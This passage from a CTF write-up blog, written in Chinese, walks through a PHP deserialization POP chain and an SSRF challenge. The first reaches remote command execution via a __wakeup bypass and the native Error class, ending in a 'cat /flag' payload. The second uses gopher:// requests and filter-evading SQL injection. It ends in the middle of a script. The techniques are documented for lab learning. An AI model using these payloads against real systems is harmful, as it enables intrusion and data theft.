invoke__">backdoor</span>();<br>        &#125;<br></code></pre></td></tr></table></figure><p>要求popko类中的$left和$right不相同但是md5编码和sha1编码强比较相同，因此popko-&gt;left和popko-&gt;right均为数组</p><p>编写poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>    &#125;<br><br>    <span class="hljs-comment">#public function __wakeup()</span><br>    <span class="hljs-comment">#&#123;</span><br>    <span class="hljs-comment">#    $this-&gt;left = &quot;&quot;;</span><br>    <span class="hljs-comment">#    $this-&gt;right = &quot;&quot;;</span><br>    <span class="hljs-comment">#&#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$pop</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">popko</span>();<br><span class="hljs-variable">$pop</span>-&gt;left=[<span class="hljs-number">1</span>];<br><span class="hljs-variable">$pop</span>-&gt;right=[<span class="hljs-number">2</span>];<br><span class="hljs-variable">$pip</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pipimi</span>();<br><span class="hljs-variable">$pip</span>-&gt;a=<span class="hljs-variable">$pop</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pip</span>);<br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230406153731384.png"></p><p>漏洞存在，注意到popko类中的__wakeup()方法若执行会将left和right的值清空，_call()方法体的条件无法满足因此要绕过__wakeup()方法，</p><p>将生成的exp进行修改：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br><span class="hljs-comment">//将popko的对象数2改为比2大的数</span><br>O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>注意到函数主体部分有判断语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>], <span class="hljs-string">&quot;popko&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>strrstr()函数区分大小写，但是php类不区分大小写，进行大写绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>GET传入c</p><p><img src="/2023/02/10/ROIS/image-20230406170242128.png"></p><p>进入后门后查看backdoor()函数体：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>$a是一个类，向类$a中传入参数$b返回值赋值给$class。但是并未定义这样一个满足条件的类，这时候就要去学习php原生类的知识了。查找到原生类ERROR。</p><p><img src="/2023/02/10/ROIS/image-20230406171445334.png"></p><p>可以看到返回值前面几个字符为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Error</span>: <span class="hljs-number">12345</span><span class="hljs-comment">#注意引号和字符串&quot;12345&quot;之间有个空格</span><br></code></pre></td></tr></table></figure><p>目的就很明确了，$a为ERROR原生类，$b为一个由命令执行函数和执行的命令组成的字符串。$d和$e代表命令执行函数在ERROR返回值中的首位置和命令执行函数的长度，$f和$g代表所执行的命令在ERROR返回值中的首位置和长度进行截取。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;ERROR&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;systemls&quot;</span><br><span class="hljs-comment">#此时error返回Error: systemls，其中s位于第七个位置，&quot;system&quot;长度6，同理，l位于13，&quot;ls&quot;长度2，则</span><br><span class="hljs-variable">$d</span> = <span class="hljs-number">7</span>;<br><span class="hljs-variable">$e</span> = <span class="hljs-number">6</span>;<br><span class="hljs-variable">$f</span> = <span class="hljs-number">13</span>;<br><span class="hljs-variable">$g</span> = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>GET传入a、b、d、e、f、g对应的值。</p><p><img src="/2023/02/10/ROIS/image-20230406172912264.png"></p><p>命令执行成功了。</p><p>对b、d、e、f、g进行修改，发现根目录下存在flag。</p><p><img src="/2023/02/10/ROIS/image-20230406173119381.png"></p><p>最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;&amp;a=<span class="hljs-built_in">Error</span>&amp;b=systemcat /flag&amp;d=<span class="hljs-number">7</span>&amp;e=<span class="hljs-number">6</span>&amp;f=<span class="hljs-number">13</span>&amp;g=<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230406173259433.png"></p>]]></content>
    
    
    <categories>
      
      <category>做题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2023/02/09/SSRF/"/>
    <url>/2023/02/09/SSRF/</url>
    
    <content type="html"><![CDATA[<h2 id="2023ROIS冬令营internal"><a href="#2023ROIS冬令营internal" class="headerlink" title="2023ROIS冬令营internal"></a>2023ROIS冬令营internal</h2><p>这是什么，两个超链接，点一下（</p><p><img src="/2023/02/09/SSRF/image-20230410150245999.png"></p><p>​SQLI页面中的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try to access it from internal!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome!\n&quot;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM messages WHERE id=<span class="hljs-subst">$id</span>&quot;</span>; <span class="hljs-comment">// SQLI &gt;_&lt;</span><br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>)[<span class="hljs-string">&#x27;message&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$message</span>;<br><span class="hljs-comment">#回显Try to access it from internal!</span><br></code></pre></td></tr></table></figure><p><code>if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;)</code>用户访问的IP必须是本地IP才能进行下面的数据库操作等步骤，也就是说只有通过网页服务器内网访问。如果我们能够通过这个服务器中的另外一个不限制于内网访问的页面，把它当做跳板间接对这个仅内网访问的页面进行操作，就能进行传参等操作。也就是实现SSRF。先看另外一个页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Hint: Do you know gopher?</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file:|ftp:|http:|scp:|dict:/i&quot;</span>,<span class="hljs-variable">$url</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br></code></pre></td></tr></table></figure><p><code>curl_init()</code>函数初始化一个curl绘会话，值传给<code>$ch</code>，<code>curl_exec()</code>函数执行一个curl会话，值传给<code>$res</code>。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：<code>&quot;Do you know gopher?&quot;</code>。emmm。。。并不知道。那就学呗。找到了一篇<a href="https://zhuanlan.zhihu.com/p/112055947">讲的比较详细的文章</a>学习了一下。</p><p>gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。</p><p>gopher协议的格式：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/_</span>后接<span class="hljs-title class_">TCP</span>数据流<br></code></pre></td></tr></table></figure><p>需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是<code>%0D%0A</code>，使用脚本或工具编码后回车换行会变成<code>%0A</code>，因此要多一步replace的步骤。在HTTP包的最后要加<code>%0D%0A</code>，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例：</p><p>GET请求：</p><p>准备好一个监听机和一个用户机：</p><p><img src="/2023/02/09/SSRF/image-20230410153558433.png"></p><p><code>nc -lp 1234</code>监听1234端口，使用curl发送http请求<code>curl gopher://172.17.0.1:1234/abcd</code>，监听机收到消息为”bcd”；发送请求<code>curl gopher://172.17.0.1:1234/aabcd</code>nc监听到abcd。因此紧跟在<code>&quot;&lt;PORT&gt;/&quot;</code>字符后面的一个字符会被忽略，可换为任意一个字符。</p><p><img src="/2023/02/09/SSRF/image-20230410182351129.png"></p><p>这是一段网页源码，作用是将GET传入的name的值打印出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个GET请求包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/ssrf.php?name=Potatowo</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.17.0.1<br>#回车<br></code></pre></td></tr></table></figure><p>经Python脚本编写，生成对应的请求包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;GET /ssrf.php?name=Margin HTTP/1.1</span><br><span class="hljs-string">Host: 172.17.0.1</span><br><span class="hljs-string">#该行要有回车，HTTP数据包结尾</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<span class="hljs-comment">#此处将&quot;%0A&quot;替换成&quot;%0D%0A&quot;</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A</span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>POST请求：</p><p>这是一段网页源码，功能不做过多赘述：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个POST请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ssrf/base/post.php</span> <span class="hljs-meta">HTTP/1.1</span><br>host:172.17.0.1<br>Content-Type:application/x-www-form-urlencoded<br>Content-Length:11<br><br><span class="language-ini"><span class="hljs-attr">name</span>=Potatowo</span><br><span class="language-ini"><span class="hljs-comment">#回车</span></span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_POST%20/ssrf/base/post.php%20HTTP/1.1%0D%0Ahost%3A172.17.0.1%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0Aname%3DPotatowo%0D%0A%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>现在回到本题；</p><p>既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包：</p><p><img src="/2023/02/09/SSRF/image-20230410194114453.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1</span><br><span class="hljs-string">Content-Length: 4</span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = result = urllib.parse.quote(result)<br><span class="hljs-comment">#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面</span><br><span class="hljs-comment">#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A</span><br><br></code></pre></td></tr></table></figure><p>改为符合gopher协议的形式，注意由于<code>curl_exec()</code>的执行是在服务端里进行的，所以<code>gopher://</code>协议的地址应改为<code>127.0.0.1:80</code>，80端口是跑web服务的端口。</p><p><img src="/2023/02/09/SSRF/image-20230410201414804.png"></p><p>将脚本中的content进行修改，<code>content = &quot;id=1 and 1=1&quot;</code>，传入，结果：</p><p><img src="/2023/02/09/SSRF/image-20230411013245234.png"></p><p>emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>看来是ban掉了union和空格。难怪，那改成<code>content = &quot;id=1/**/and/**/1=1&quot;</code>绕过空格过滤，回显<code>&quot;Welcome! meow meow meow~1&quot;</code>，改成<code>content = &quot;id=1/**/and/**/1=2&quot;</code>，回显<code>&quot;Welcome! 1&quot;</code>。sql语句判断为真会返回<code>&quot;Welcome! meow meow meow~1&quot;</code>，为假不含<code>meow meow meow~</code>，同时union被ban了，尝试用加号拼接<code>&quot;uni&quot;</code>,<code>&quot;on&quot;</code>，结果加号url编码与空格相同（悲，现在意图也比较明显了，布尔盲注。</p><p>完善脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br><span 